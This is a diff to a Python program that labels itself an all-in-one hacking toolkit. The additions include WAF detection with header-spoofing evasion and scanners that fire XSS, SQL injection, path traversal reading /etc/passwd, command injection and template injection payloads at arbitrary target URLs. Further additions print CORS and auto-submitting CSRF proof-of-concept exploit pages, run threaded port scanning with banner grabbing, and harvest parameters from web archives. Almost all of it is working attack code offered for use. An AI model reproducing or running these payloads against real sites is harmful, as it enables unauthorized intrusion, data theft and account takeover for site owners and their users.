@@ -53,9 +53,23 @@ BANNER = f"""{R}
   ██║ ╚████║╚██████╔╝███████║██║  ██║   ██║   ╚██████╔╝╚██████╔╝███████╗
   ╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
 {N}{D}  ════════════════════════════════════════════════════════════════════{N}
-  {C}ALL-IN-ONE HACKING TOOLKIT{N}{D}   v{VERSION}{N}{D}   [{G}DEFACE{N}{D}][{Y}AUTOPWN{N}{D}][{M}BRUTE{N}{D}][{R}EXPLOIT{N}{D}][{C}CRACK{N}{D}]{N}
+   {C}ALL-IN-ONE HACKING TOOLKIT{N}{D}   v{VERSION}{N}{D}   [{R}AUTOHACK{N}{D}][{G}WEBSHELL{N}{D}][{Y}REVSHELL{N}{D}][{M}LFI2RCE{N}{D}][{B}SQLDUMP{N}{D}]{N}
 {C}  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{N}
 """
+
+
+def check_update():
+    """Check GitHub for newer version."""
+    try:
+        r = requests.get("https://raw.githubusercontent.com/anomalyco/nusatool/main/nusatool.py", timeout=5)
+        for line in r.text.split("\n"):
+            if line.startswith("VERSION = "):
+                v = line.split('"')[1]
+                if v != VERSION:
+                    print(f"  {Y}⬆ Update available: v{VERSION} → v{v}{N}")
+                    print(f"  {C}  https://github.com/anomalyco/nusatool{N}")
+                return
+    except: pass
 
 
 # ══════════════════════════════════════════════════════
@@ -63,17 +77,21 @@ BANNER = f"""{R}
 # ══════════════════════════════════════════════════════
 
 class BypassEngine:
-    def __init__(self, target_url):
+    def __init__(self, target_url, proxy=None):
         self.url = target_url; self.waf_detected = False; self.waf_name = None
         self.connected = False; self.connect_error = None; self.status_code = None
-        self.bypass_headers = {}; self.ua_list = []; self._detect_waf(); self._build_headers()
+        self.bypass_headers = {}; self.ua_list = []; self.proxy = proxy
+        self._session = requests.Session()
+        self._session.verify = False
+        if proxy: self._session.proxies = {"http": proxy, "https": proxy}
+        self._detect_waf(); self._build_headers()
 
     def check_connection(self):
         """Test connectivity and return True if reachable."""
         if self.connected:
             return True
         try:
-            r = requests.get(self.url, timeout=10, verify=False)
+            r = self._session.get(self.url, timeout=10)
             self.status_code = r.status_code
             self.connected = True
             return True
@@ -89,33 +107,58 @@ class BypassEngine:
 
     def _detect_waf(self):
         try:
-            r = requests.get(self.url, timeout=10, verify=False)
+            r = self._session.get(self.url, timeout=10)
             self.connected = True
             self.status_code = r.status_code
             self.waf_raw = r.text
             sigs = {
-                "Cloudflare": ["cloudflare", "__cfduid", "cf-ray"],
-                "ModSecurity": ["mod_security", "modsecurity", "405 not allowed"],
-                "AWS WAF": ["awswaf", "x-amzn-", "aws"],
-                "Akamai": ["akamai", "akamaighost"],
-                "Imperva": ["incapsula", "imperva"],
-                "Sucuri": ["sucuri", "cloudproxy"],
-                "Barracuda": ["barracuda"],
-                "F5 BIG-IP": ["bigip", "f5"],
+                "Cloudflare": ["cloudflare", "__cfduid", "cf-ray", "cf-request-id"],
+                "ModSecurity": ["mod_security", "modsecurity", "405 not allowed", "not acceptable"],
+                "AWS WAF": ["awswaf", "x-amzn-", "aws", "x-amz-request-id"],
+                "Akamai": ["akamai", "akamaighost", "akamaipixel"],
+                "Imperva": ["incapsula", "imperva", "x-iinfo"],
+                "Sucuri": ["sucuri", "cloudproxy", "sucuri-cloudproxy"],
+                "Barracuda": ["barracuda", "barra"],
+                "F5 BIG-IP": ["bigip", "f5", "ts01cbe", "x-application-context"],
                 "Fortinet": ["fortigate", "fortiwaf", "fortiweb"],
-                "Wordfence": ["wordfence"],
-                "Comodo WAF": ["comodo"],
-                "Radware": ["radware", "appwall"],
-                "Citrix Netscaler": ["netscaler", "citrix"],
+                "Wordfence": ["wordfence", "wfblock"],
+                "Comodo WAF": ["comodo", "cwatch"],
+                "Radware": ["radware", "appwall", "x-sl-compstate"],
+                "Citrix Netscaler": ["netscaler", "citrix", "ns-"],
                 "DenyALL": ["denyall", "rbl"],
                 "Safe3 WAF": ["safe3", "safe3waf"],
                 "NAXSI": ["naxsi", "blocked by naxsi"],
                 "WebKnight": ["webknight", "webknight"],
-                "Airlock": ["airlock"],
-                "Yundun": ["yundun"],
+                "Airlock": ["airlock", "x-ua-compatible"],
+                "Yundun": ["yundun", "yundunwaf"],
                 "Safedog": ["safedog", "safedogwaf"],
-                "DDoS-Guard": ["ddos-guard"],
-                "Varnish": ["varnish"],
+                "DDoS-Guard": ["ddos-guard", "x-ddos-guard"],
+                "Varnish": ["varnish", "x-varnish"],
+                "Litespeed": ["litespeed", "x-litespeed-cache"],
+                "StackPath": ["stackpath", "stackpathcdn"],
+                "Fastly": ["fastly", "x-fastly"],
+                "KeyCDN": ["keycdn", "x-keycdn"],
+                "Azure WAF": ["azure", "x-ms-request-id", "x-azure"],
+                "GCP Cloud Armor": ["cloud-armor", "x-cloud-trace", "gcp"],
+                "BlockDoS": ["blockdos", "x-blockdos"],
+                "Reblaze": ["reblaze", "x-reblaze"],
+                "NSFocus": ["nsfocus", "nsfocuswaf"],
+                "U.S. Robotics": ["usrobotics", "usr"],
+                "Chaitin SafeLine": ["safeline", "safelinewaf", "chaitin"],
+                "Huawei Cloud WAF": ["huawei", "hwwaf"],
+                "Baidu Yunjiasu": ["yunjiasu", "baidu"],
+                "Alibaba Cloud WAF": ["aliyundun", "waf_alert"],
+                "Qcloud (Tencent)": ["qcloud", "tencentwaf", "txwaf"],
+                "WangZhan": ["wangzhan", "wangzhanwaf"],
+                "HTTP:BL (Project Honey)": ["httpbl", "projecthoneypot"],
+                "Kona SiteDefender": ["kona", "sitedefender", "akamaikona"],
+                "Palo Alto": ["panw", "paloalto", "x-pan"],
+                "SEnginx": ["senginx", "se-nginx"],
+                "URLScan": ["urlscan", "rejected-by-urlscan"],
+                "Profense": ["profense", "pl-"],
+                "ZScaler": ["zscaler", "zscalertwo"],
+                "NullDDoS": ["nullddos", "x-null"],
+                "CrawlProtect": ["crawlprotect", "x-crawl"],
             }
             for name, sigs_list in sigs.items():
                 for sig in sigs_list:
@@ -185,17 +228,19 @@ class BypassEngine:
     def get(self, url, **kwargs):
         hdrs = {**self.bypass_headers, "User-Agent": random.choice(self.ua_list), **kwargs.pop("headers", {})}
         if self.waf_detected: hdrs["X-Forwarded-For"] = self._rand_ip()
-        return requests.get(url, headers=hdrs, verify=False, **kwargs)
+        return self._session.get(url, headers=hdrs, **kwargs)
 
     def post(self, url, **kwargs):
         hdrs = {**self.bypass_headers, "User-Agent": random.choice(self.ua_list), **kwargs.pop("headers", {})}
-        return requests.post(url, headers=hdrs, verify=False, **kwargs)
+        return self._session.post(url, headers=hdrs, **kwargs)
 
     def info(self):
         if self.connect_error:
             return f"  {R}✘ {self.connect_error}{N}"
         if self.waf_detected:
             return f"  {Y}⚠ WAF: {BOLD}{self.waf_name}{N}{D}  bypass active ({len(self.bypass_headers)} headers){N}"
+        if self.status_code in (403, 401, 503):
+            return f"  {R}⚠ Blocked{N}{D}  [HTTP {self.status_code} — access denied]{N}"
         status = f"  {G}✔ Reachable{N}{D}  [HTTP {self.status_code}]{N}" if self.connected else ""
         waf = f"  {G}✔ No WAF detected{N}"
         return f"{status}\n{waf}"
@@ -210,12 +255,11 @@ class CORSScanner:
         self.url = url.rstrip("/"); self.bypass = bypass or BypassEngine(url); self.vulns = []
 
     def scan(self):
-        header("CORS EXPLOIT CHECK")
+        header("CORS EXPLOITER — ORIGIN MISCONFIG")
         print(f"  {C}◉{N} URL  : {Y}{self.url}{N}")
         print(f"  {self.bypass.info()}{N}")
         if self.bypass.connect_error:
-            print(f"\n  {R}✘{N} Target unreachable — aborting.\n")
-            return []
+            print(f"\n  {R}✘{N} Target unreachable.\n"); return []
         origins = [
             "https://evil.com", "null", "http://evil.com",
             "https://evil.com.evil.com", "https://evil.com/",
@@ -245,18 +289,28 @@ class CORSScanner:
                     print(f"  {D}[?] CORS: {Y}{origin}{N} → ACAO: {acao}{N}")
             except requests.RequestException as e:
                 errors += 1
-                if errors == 1:
-                    print(f"  {R}⚠{N} Request failed: {e}")
-        if errors > 1:
-            print(f"  {R}⚠{N} ...and {errors-1} more request(s) failed")
+                if errors == 1: print(f"  {R}⚠{N} Request failed: {e}")
+        if errors > 1: print(f"  {R}⚠{N} ...and {errors-1} more")
 
-        if not self.vulns:
-            print(f"\n  {G}✔{N} No CORS misconfigurations detected.")
+        if self.vulns:
+            print(f"\n  {R}{BOLD}⚠ {len(self.vulns)} CORS issue(s)!{N}")
+            ptable(["#","ORIGIN","ISSUE"], [[str(i+1),v["origin"][:35],v["issue"]] for i,v in enumerate(self.vulns)], colors=[R]*len(self.vulns))
+            print(f"\n  {BOLD}{C}PoC EXPLOIT HTML{N}")
+            for v in self.vulns:
+                print(f"""  {W}<html>
+  <body>
+  <h1>CORS PoC — {v['origin']}</h1>
+  <script>
+  var xhr = new XMLHttpRequest();
+  xhr.open('GET', '{self.url}', true);
+  xhr.withCredentials = {'true' if 'Credentials' in v['issue'] else 'false'};
+  xhr.onload = function() {{ alert(xhr.responseText); }};
+  xhr.send();
+  </script>
+  </body>
+  </html>{N}""")
         else:
-            print(f"\n  {R}{BOLD}⚠ {len(self.vulns)} CORS issue(s) found!{N}")
-            ptable(["#", "ORIGIN", "ISSUE"],
-                   [[str(i+1), v["origin"][:35], v["issue"]] for i, v in enumerate(self.vulns)],
-                   colors=[R]*len(self.vulns))
+            print(f"\n  {G}✔{N} No CORS misconfigurations detected.")
         print(); return self.vulns
 
 
@@ -271,12 +325,11 @@ class CSRFScanner:
                               "xsrf", "csrf_token", "csrfmiddlewaretoken", "__csrf"]
 
     def scan(self):
-        header("CSRF TOKEN BYPASS CHECK")
+        header("CSRF EXPLOITER — TOKEN BYPASS + PoC")
         print(f"  {C}◉{N} URL  : {Y}{self.url}{N}")
         print(f"  {self.bypass.info()}{N}")
         if self.bypass.connect_error:
-            print(f"\n  {R}✘{N} Target unreachable — aborting.\n")
-            return []
+            print(f"\n  {R}✘{N} Target unreachable.\n"); return []
 
         try:
             r = self.bypass.get(self.url, timeout=10)
@@ -289,7 +342,7 @@ class CSRFScanner:
                 forms.append(r.text[fs:fe+7]); i = fe + 7
 
             if not forms:
-                print(f"  {Y}⚠{N} No forms found on page.\n"); return []
+                print(f"  {Y}⚠{N} No forms found.\n"); return []
 
             print(f"  {C}◉{N} Found {len(forms)} form(s)\n")
 
@@ -308,45 +361,46 @@ class CSRFScanner:
                     ie = form.find(">", is_)
                     if ie == -1: break
                     inp = form[is_:ie+1]
-                    name, itype = "", ""
-                    import re
                     nm = re.search(r'name=["\']([^"\']+)["\']', inp)
                     ty = re.search(r'type=["\']([^"\']+)["\']', inp)
-                    if nm: name = nm.group(1)
-                    if ty: itype = ty.group(1)
-                    inputs.append({"name": name, "type": itype, "html": inp})
+                    name = nm.group(1) if nm else ""
+                    itype = ty.group(1) if ty else ""
+                    inputs.append({"name": name, "type": itype})
                     j = ie + 1
 
-                has_csrf = any(
-                    any(kw in inp["name"].lower() for kw in self.csrf_keywords)
-                    for inp in inputs if inp["name"]
-                )
-                has_hidden = any(inp["type"] == "hidden" for inp in inputs)
+                has_csrf = any(any(kw in inp["name"].lower() for kw in self.csrf_keywords) for inp in inputs if inp["name"])
 
                 action = ""
                 am = re.search(r'action=["\']([^"\']+)["\']', form[:300])
                 if am: action = am.group(1)
 
                 if not has_csrf and method == "POST":
-                    self.vulns.append({"form": fi+1, "method": method, "action": action, "issue": "No CSRF token"})
-                    print(f"  {R}[!] VULN #{fi+1}{N} Method: {Y}{method}{N}  Action: {D}{action[:40]}{N}")
-                    print(f"      {R}→ No CSRF protection token found!{N}")
+                    action_url = urljoin(self.url, action) if action else self.url
+                    self.vulns.append({"form": fi+1, "method": method, "action": action_url, "inputs": [i for i in inputs if i["name"]], "issue": "No CSRF token"})
+                    print(f"  {R}[!] VULN #{fi+1}{N} Method: {Y}{method}{N}  Action: {Y}{action_url}{N}")
+                    print(f"      {R}→ No CSRF token!{N}")
                     for inp in inputs:
-                        if inp["name"]:
-                            print(f"      {D}param: {inp['name']}{N}")
+                        if inp["name"]: print(f"      {D}param: {inp['name']} ({inp['type']}){N}")
                 elif has_csrf:
-                    print(f"  {G}[✔] Form #{fi+1}{N} CSRF protected  {D}[token found]{N}")
+                    print(f"  {G}[✔] Form #{fi+1}{N} CSRF protected")
                 elif method == "GET":
-                    print(f"  {D}[−] Form #{fi+1}{N} GET method  {D}(CSRF not applicable){N}")
-        except requests.RequestException as e:
-            print(f"  {R}✘{N} CSRF scan error: {e}")
+                    print(f"  {D}[−] Form #{fi+1}{N} GET method")
         except Exception as e:
-            print(f"  {R}✘{N} CSRF scan error: {e}")
+            print(f"  {R}✘{N} CSRF error: {e}")
 
         if self.vulns:
             print(f"\n  {R}{BOLD}⚠ {len(self.vulns)} CSRF vulnerable form(s)!{N}")
+            print(f"\n  {BOLD}{C}PoC HTML FORMS{N}")
+            for v in self.vulns:
+                html_fields = "\n".join(f'    <input type="text" name="{i["name"]}" value="pwned">' for i in v["inputs"] if i["name"])
+                action_attr = f'action="{v["action"]}"' if v["action"] else ""
+                print(f"""  {W}<form {action_attr} method="{v["method"]}">
+{html_fields}
+    <input type="submit" value="Submit">
+  </form>
+  <script>document.forms[0].submit();</script>{N}""")
         else:
-            print(f"\n  {G}✔{N} No CSRF issues detected (or forms are protected).")
+            print(f"\n  {G}✔{N} No CSRF issues.")
         print(); return self.vulns
 
 
@@ -469,116 +523,110 @@ class URLScanner:
     def _req(self, u, method="GET", data=None):
         try:
             return self.bypass.get(u, timeout=10, allow_redirects=False) if method == "GET" else self.bypass.post(u, data=data, timeout=10, allow_redirects=False)
-        except requests.ConnectionError as e:
-            self.errors.append(f"Connection error: {u[:60]}... ({e})")
-            return None
-        except requests.Timeout:
-            self.errors.append(f"Timeout: {u[:60]}...")
-            return None
-        except Exception as e:
-            self.errors.append(f"Request failed: {u[:60]}... ({e})")
-            return None
+        except: return None
 
-    def _test_xss(self, param, payload):
-        new = urllib.parse.urlencode({k: (payload if k == param else v[0]) for k, v in parse_qs(self.parsed.query).items()})
-        u = f"{self.parsed.scheme}://{self.parsed.netloc}{self.parsed.path}?{new}"
-        r = self._req(u)
-        if r and payload.lower() in r.text.lower(): return ("XSS", payload, u)
-        for enc, ename in [(urllib.parse.quote(payload), "url"), (payload.upper(), "upper")]:
-            new2 = urllib.parse.urlencode({k: (enc if k == param else v[0]) for k, v in parse_qs(self.parsed.query).items()})
-            u2 = f"{self.parsed.scheme}://{self.parsed.netloc}{self.parsed.path}?{new2}"
-            r2 = self._req(u2)
-            if r2 and (payload.lower() in r2.text.lower() or payload.upper() in r2.text.upper()):
-                return (f"XSS ({ename} bypass)", payload, u2)
+    def _test_xss(self, param):
+        marker = f"NUSAURLXSS_{random.randint(10000,99999)}_PROOF"
+        for payload in [f"<script>alert('{marker}')</script>", f"<img src=x onerror=alert('{marker}')>",
+            f'"><script>alert("{marker}")</script>', f"<svg onload=alert('{marker}')>"]:
+            new = urllib.parse.urlencode({k: (payload if k == param else v[0]) for k, v in parse_qs(self.parsed.query).items()})
+            u = f"{self.parsed.scheme}://{self.parsed.netloc}{self.parsed.path}?{new}"
+            r = self._req(u)
+            if r and marker in (r.text or ""):
+                idx = r.text.find(marker)
+                ctx = r.text[max(0,idx-40):idx+len(marker)+40].strip()
+                return ("XSS", payload, u, f"Reflected: {ctx[:120]}")
         return None
 
-    def _test_sqli(self, param, payload):
-        new = urllib.parse.urlencode({k: (payload if k == param else v[0]) for k, v in parse_qs(self.parsed.query).items()})
-        u = f"{self.parsed.scheme}://{self.parsed.netloc}{self.parsed.path}?{new}"; r = self._req(u)
-        if not r: return None
-        for p in ["sql", "syntax error", "mysql", "odbc", "oracle", "postgresql", "sqlite", "unclosed quotation", "warning: mysql", "invalid query", "ora-"]:
-            if p in r.text.lower(): return ("SQLi", payload, u, f"Error: {p}")
-        if r.status_code in (500, 404, 403): return ("SQLi", payload, u, f"HTTP {r.status_code}")
+    def _test_sqli(self, param):
+        for payload in ["'", "' OR '1'='1--", "' OR 1=1--", "\" OR \"1\"=\"1", "' UNION SELECT 1,2,3--"]:
+            new = urllib.parse.urlencode({k: (payload if k == param else v[0]) for k, v in parse_qs(self.parsed.query).items()})
+            u = f"{self.parsed.scheme}://{self.parsed.netloc}{self.parsed.path}?{new}"
+            r = self._req(u)
+            if not r: continue
+            for p in ["sql","syntax error","mysql","odbc","oracle","postgresql","unclosed quotation","ora-"]:
+                if p in (r.text or "").lower(): return ("SQLi", payload, u, f"DB error: {p}")
+            if r.status_code in (500, 404, 403): return ("SQLi", payload, u, f"HTTP {r.status_code}")
         return None
 
     def _test_lfi(self, param):
         for pay in ["../../../../etc/passwd", "..\\..\\..\\windows\\win.ini", "/etc/passwd",
-                     "....//....//....//etc/passwd", "../../../etc/passwd%00",
                      "php://filter/convert.base64-encode/resource=index"]:
             new = urllib.parse.urlencode({k: (pay if k == param else v[0]) for k, v in parse_qs(self.parsed.query).items()})
-            u = f"{self.parsed.scheme}://{self.parsed.netloc}{self.parsed.path}?{new}"; r = self._req(u)
+            u = f"{self.parsed.scheme}://{self.parsed.netloc}{self.parsed.path}?{new}"
+            r = self._req(u)
             if not r: continue
-            if "root:x:" in r.text or "[extensions]" in r.text or "boot loader" in r.text.lower(): return ("LFI", pay, u)
-            if "PD9waHA" in r.text or "base64" in r.text[:200]: return ("LFI (PHP filter)", pay, u)
+            if "root:x:" in (r.text or ""): return ("LFI", pay, u, "Read /etc/passwd ✅")
+            if "PD9waHA" in (r.text or ""): return ("LFI (PHP filter)", pay, u, "Base64-encoded source ✅")
+            if "[extensions]" in (r.text or "").lower(): return ("LFI (win.ini)", pay, u, "Read Windows config ✅")
         return None
 
-    def _test_open_redirect(self, param):
+    def _test_redirect(self, param):
         for pay in ["//evil.com", "https://evil.com/"]:
             new = urllib.parse.urlencode({k: (pay if k == param else v[0]) for k, v in parse_qs(self.parsed.query).items()})
-            u = f"{self.parsed.scheme}://{self.parsed.netloc}{self.parsed.path}?{new}"; r = self._req(u)
-            if not r: continue
-            if r.status_code in (301, 302, 307, 308) and "evil" in r.headers.get("Location", ""): return ("Open Redirect", pay, u)
+            u = f"{self.parsed.scheme}://{self.parsed.netloc}{self.parsed.path}?{new}"
+            r = self._req(u)
+            if r and r.status_code in (301, 302, 307, 308):
+                loc = r.headers.get("Location", "")
+                if "evil" in loc: return ("Open Redirect", pay, u, f"Redirects to: {loc}")
         return None
 
     def _test_cmdi(self, param):
         for pay in [";id", "|id", "`id`", "$(id)"]:
             new = urllib.parse.urlencode({k: (pay if k == param else v[0]) for k, v in parse_qs(self.parsed.query).items()})
-            u = f"{self.parsed.scheme}://{self.parsed.netloc}{self.parsed.path}?{new}"; r = self._req(u)
-            if r and ("uid=" in r.text or "gid=" in r.text): return ("Command Injection", pay, u)
+            u = f"{self.parsed.scheme}://{self.parsed.netloc}{self.parsed.path}?{new}"
+            r = self._req(u)
+            if r and ("uid=" in (r.text or "") or "gid=" in (r.text or "")):
+                match = re.search(r'uid=\d+\(\w+\)\s+gid=\d+\(\w+\)', r.text or "")
+                if match: return ("Command Injection", pay, u, f"Output: {match.group()}")
         return None
 
     def _test_ssti(self, param):
-        for pay in ["{{7*7}}", "${7*7}", "<%= 7*7 %>"]:
+        # Use unique marker to avoid false positives
+        marker = random.randint(1000,9999)
+        expected = str(marker * 7)
+        for pay in [f"{{{{{marker}*7}}}}", f"${{{{{marker}*7}}}}", f"<%={marker*7}%>"]:
             new = urllib.parse.urlencode({k: (pay if k == param else v[0]) for k, v in parse_qs(self.parsed.query).items()})
-            u = f"{self.parsed.scheme}://{self.parsed.netloc}{self.parsed.path}?{new}"; r = self._req(u)
-            if r and "49" in r.text and pay == "{{7*7}}": return ("SSTI (Jinja2/Twig)", pay, u)
+            u = f"{self.parsed.scheme}://{self.parsed.netloc}{self.parsed.path}?{new}"
+            r = self._req(u)
+            if r and expected in (r.text or ""):
+                # Verify it's NOT in the normal response (no param injection)
+                r2 = self._req(self.url)
+                if r2 and expected not in (r2.text or ""):
+                    return ("SSTI (Jinja2/Twig)", pay, u, f"{marker}*7 = {expected} ✅")
         return None
 
     def scan(self):
-        header("URL EXPLOIT SCANNER  [6-in-1]")
+        header("URL EXPLOIT — 6-IN-1 SCANNER + PROOF")
         print(f"  {C}◉{N} URL  : {Y}{self.url}{N}")
         print(f"  {self.bypass.info()}{N}")
         if self.bypass.connect_error:
-            print(f"\n  {R}✘{N} Target unreachable — aborting scan.\n")
-            return []
+            print(f"\n  {R}✘{N} Target unreachable.\n"); return []
         if not self.params:
-            print(f"  {Y}⚠{N} No URL parameters in query string. Use ParamSpider first to find parameters.\n")
-            return []
+            print(f"  {Y}⚠{N} No params. Use ParamSpider first.\n"); return []
         print(f"  {C}◉{N} Params: {len(self.params)} | Scans: {Y}XSS, SQLi, LFI, Redirect, CMDi, SSTI{N}\n")
 
-        checks = [("XSS", self._test_xss, ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
-            "\"><script>alert(1)</script>", "';alert(1);//", "<svg onload=alert(1)>"]),
-            ("SQLi", self._test_sqli, ["'", "' OR '1'='1", "' OR 1=1--", "\" OR \"1\"=\"1", "' UNION SELECT 1,2,3--"]),
-            ("LFI", self._test_lfi, [""]), ("Open Redirect", self._test_open_redirect, [""]),
-            ("Cmd Inj", self._test_cmdi, [""]), ("SSTI", self._test_ssti, [""])]
-
-        total = sum(len(c[2]) for c in checks) * len(self.params); done = 0
-        for vname, func, payloads in checks:
+        tests = [("XSS", self._test_xss), ("SQLi", self._test_sqli), ("LFI", self._test_lfi),
+                 ("Redirect", self._test_redirect), ("CMDi", self._test_cmdi), ("SSTI", self._test_ssti)]
+        total = len(tests) * len(self.params); done = 0
+        for vname, func in tests:
             for param in self.params:
-                for payload in payloads:
-                    done += 1
-                    print(f"  {D}[{done}/{total}] {vname} → {param}...{N}", end="\r")
-                    try:
-                        result = func(param, payload) if payload else func(param)
-                        if result:
-                            typ, pay, u = result[0], result[1], result[2]
-                            extra = f" | {result[3]}" if len(result) > 3 else ""
-                            self.vulns.append({"type": typ, "param": param, "payload": pay, "url": u, "extra": extra})
-                            print(f"\n  {R}{BOLD}[!] {typ}{N}  {Y}{param}{N}{D}{extra}{N}")
-                            print(f"      {D}payload: {pay[:60]}{N}")
-                    except Exception as e:
-                        self.errors.append(f"{vname} crash: {e}")
-        if self.errors and len(self.errors) < 10:
-            for e in self.errors:
-                print(f"  {R}⚠{N} {e}")
+                done += 1
+                print(f"  {D}[{done}/{total}] {vname} → {param}...{N}", end="\r")
+                try:
+                    result = func(param)
+                    if result:
+                        typ, pay, u, extra = result
+                        self.vulns.append({"type": typ, "param": param, "payload": pay, "url": u, "extra": extra})
+                        print(f"\n  {R}{BOLD}[!] {typ}{N}  {Y}{param}{N}")
+                        print(f"      {W}{extra}{N}")
+                        print(f"      {D}PoC: {Y}{u}{N}")
+                except Exception as e:
+                    self.errors.append(f"{vname} crash: {e}")
         if self.vulns:
-            print(f"\n  {R}{BOLD}⚠ {len(self.vulns)} vulnerabilities!{N}")
-            ptable(["#", "TYPE", "PARAM", "PAYLOAD"],
-                   [[str(i+1), v["type"], v["param"], v["payload"][:35]] for i, v in enumerate(self.vulns)],
-                   colors=[R]*len(self.vulns))
-        else: print(f"\n\n  {G}✔{N} No vulnerabilities detected.")
-        if self.errors and len(self.errors) >= 10:
-            print(f"  {D}({len(self.errors)} errors suppressed){N}")
+            print(f"\n  {R}{BOLD}⚠ {len(self.vulns)} exploitable vuln(s)!{N}")
+            ptable(["#","TYPE","PARAM","RESULT"], [[str(i+1),v["type"],v["param"],v["extra"][:40]] for i,v in enumerate(self.vulns)], colors=[R]*len(self.vulns))
+        else: print(f"\n\n  {G}✔{N} No vulns detected.")
         print(); return self.vulns
 
 
@@ -599,34 +647,36 @@ class ParamSpider:
         """Fetch URLs from Wayback Machine CDX API."""
         urls = set()
         try:
-            filters = "&filter=statuscode:200&filter=statuscode:301&filter=statuscode:302"
-            url = f"http://web.archive.org/cdx/search/cdx?url={domain}/*&output=json&fl=original,timestamp{filters}&limit=10000"
-            r = requests.get(url, timeout=30, headers={"User-Agent": "Mozilla/5.0"})
-            if r.status_code == 200:
+            url = f"http://web.archive.org/cdx/search/cdx?url={domain}/*&output=json&fl=original,timestamp&limit=10000&filter=statuscode:200"
+            r = requests.get(url, timeout=60, headers={"User-Agent": "Mozilla/5.0"})
+            if r.status_code == 200 and r.text.strip():
                 data = r.json()
-                for entry in data[1:]:  # skip header
+                for entry in data[1:]:
                     if len(entry) >= 1:
                         u = entry[0]
                         if self.include_subs or self.domain in u:
                             urls.add(u)
-        except: pass
+        except Exception as e:
+            print(f"  {Y}⚠{N} Wayback error: {e}")
         return urls
 
     def _fetch_commoncrawl(self, domain):
         """Fetch URLs from CommonCrawl index."""
         urls = set()
         try:
-            url = f"http://index.commoncrawl.org/CC-MAIN-2024-10-index?url={domain}/*&output=json&limit=5000"
-            r = requests.get(url, timeout=30, headers={"User-Agent": "Mozilla/5.0"})
-            if r.status_code == 200:
-                for line in r.text.strip().split("\n"):
-                    try:
-                        entry = json.loads(line)
-                        u = entry.get("url", "")
-                        if u and (self.include_subs or self.domain in u):
-                            urls.add(u)
-                    except: continue
-        except: pass
+            for cc in ["CC-MAIN-2024-10", "CC-MAIN-2024-18", "CC-MAIN-2024-26", "CC-MAIN-2024-38"]:
+                url = f"http://index.commoncrawl.org/{cc}-index?url={domain}/*&output=json&limit=2000"
+                r = requests.get(url, timeout=60, headers={"User-Agent": "Mozilla/5.0"})
+                if r.status_code == 200 and r.text.strip():
+                    for line in r.text.strip().split("\n"):
+                        try:
+                            entry = json.loads(line)
+                            u = entry.get("url", "")
+                            if u and (self.include_subs or self.domain in u):
+                                urls.add(u)
+                        except: continue
+        except Exception as e:
+            print(f"  {Y}⚠{N} CommonCrawl error: {e}")
         return urls
 
     def _extract_params(self, url):
@@ -746,29 +796,57 @@ class PortScanner:
             if "-" in p: a, b = p.split("-"); self.pl.update(range(int(a),int(b)+1))
             else: self.pl.add(int(p))
         self.pl = sorted(self.pl)
+    def _grab_banner(self, p):
+        """Grab service banner from open port."""
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(3)
+            s.connect((self.ip, p))
+            # Send common probe
+            if p in (80, 443, 8080, 8443):
+                s.sendall(b"GET / HTTP/1.0\r\nHost: %s\r\n\r\n" % self.target.encode())
+            elif p == 21:
+                pass  # Banner is sent on connect
+            elif p == 22:
+                pass
+            elif p == 25:
+                s.sendall(b"EHLO nusatool\r\n")
+            banner = b""
+            try:
+                while True:
+                    d = s.recv(256)
+                    if not d: break
+                    banner += d
+                    if len(banner) > 1024: break
+            except socket.timeout: pass
+            s.close()
+            text = banner.decode("utf-8", errors="replace").strip()[:100]
+            return text if text else "no banner"
+        except: return ""
     def _scan(self, p):
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(self.timeout)
             if s.connect_ex((self.ip, p)) == 0:
                 try: sv = socket.getservbyport(p)
                 except: sv = "?"
-                self.open_ports.append((p, sv))
+                banner = self._grab_banner(p)
+                self.open_ports.append((p, sv, banner))
             s.close()
         except: pass
     def _worker(self):
         while not self.q.empty():
             self._scan(self.q.get()); self.q.task_done()
-    def     run(self):
-        header("PORT SWEEPER")
-        print(f"  {C}◉{N} Target: {BOLD}{W}{self.target}{N}  |  IP: {Y}{self.ip}{N}  |  Ports: {len(self.pl)}")
+    def run(self):
+        header("PORT SCANNER + BANNER GRAB")
+        print(f"  {C}◉{N} Target: {W}{self.target}{N}  |  IP: {Y}{self.ip}{N}  |  Ports: {len(self.pl)}")
         for p in self.pl: self.q.put(p)
         for _ in range(min(100, len(self.pl))): threading.Thread(target=self._worker, daemon=True).start()
         self.q.join()
         if self.open_ports:
             print(f"\n  {G}✔{N} {BOLD}{len(self.open_ports)} open port(s)!{N}")
-            ptable(["PORT","STATE","SERVICE"], [[f"{p}/tcp",G+"open"+N,s] for p,s in self.open_ports])
+            ptable(["PORT","STATE","SERVICE","BANNER"], [[f"{p}/tcp",G+"open"+N,s,b[:40]] for p,s,b in self.open_ports])
         else: print(f"\n  {R}✘{N} No open ports.")
-        print(f"  {D}{'─'*40}{N}\n"); return self.open_ports
+        print(f"  {D}{'─'*50}{N}\n"); return self.open_ports
 
 COMMON_PORTS = [21,22,23,25,53,80,110,111,135,139,143,389,443,445,465,993,995,1433,1521,
                 2049,2082,2083,2096,2375,2376,3306,3389,4333,4444,4848,5000,5432,5900,
@@ -817,98 +895,217 @@ class ServiceDetector:
 
 class XSSScanner:
     def __init__(self, url, method="GET", param=None, bypass=None):
-        self.url = url; self.method = method; self.param = param
+        self.url = url; self.method = method.upper(); self.param = param
         self.bypass = bypass or BypassEngine(url); self.vulns = []
+        self.marker = lambda: f"NUSAXSS_{random.randint(10000,99999)}_PROOF"
         self.payloads = ["<script>alert('XSS')</script>","<script>confirm('XSS')</script>",
-            "<script>prompt('XSS')</script>","<img src=x onerror=alert('XSS')>",
-            "<svg onload=alert('XSS')>","<body onload=alert('XSS')>",
+            "<img src=x onerror=alert('XSS')>","<svg onload=alert('XSS')>",
             "\"><script>alert('XSS')</script>","'><script>alert('XSS')</script>",
             "javascript:alert('XSS')","<ScRiPt>alert('XSS')</ScRiPt>"]
-        self.bp = ["%3Cscript%3Ealert(1)%3C/script%3E","<scr<script>ipt>alert(1)</scr</script>ipt>",
-            "<%00script>alert(1)</%00script>","<script/random=123>alert(1)</script>"]
     def _get_params(self):
         p = parse_qs(urlparse(self.url).query); return list(p.keys()) if p else []
